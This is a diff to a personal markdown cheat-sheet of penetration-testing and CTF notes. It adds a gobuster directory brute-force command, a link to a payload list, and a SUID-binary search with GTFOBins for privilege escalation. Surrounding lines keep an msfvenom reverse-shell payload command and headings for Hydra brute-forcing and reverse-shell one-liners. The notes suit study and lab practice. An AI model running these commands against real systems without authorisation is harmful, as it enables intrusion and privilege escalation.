@@ -103,6 +103,10 @@ All kind of enumeration topics
 Good to download a wordlist from github
 take a big one and remove "manual"
 
+*gobuster*
+
+    gobuster dir -u <ip> -w /usr/share/wordlists/x
+
 **Enumeration**
 
 *Wordpress Scan*
@@ -591,6 +595,10 @@ Should give you root access
 
     msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=4444 -f exe -o shell.exe
 
+List of Payloads to generate
+
+https://netsec.ws/?p=331 
+
 **Bruteforce attacks**
 
 *Hydra for SSH*
@@ -1071,6 +1079,19 @@ Go in virtual network editor
     run autoroute -p 
 
 **CTF Notes**
+
+*SUID*
+
+Get files that have the SUID Bit set 
+
+    find / -perm -u=s -type f 2>/dev/null
+
+good entry point is systemctl
+
+https://gtfobins.github.io/
+
+Search for systemcrl - SUID
+paste the lines each single
 
 *Reverse Shell one liner*
 
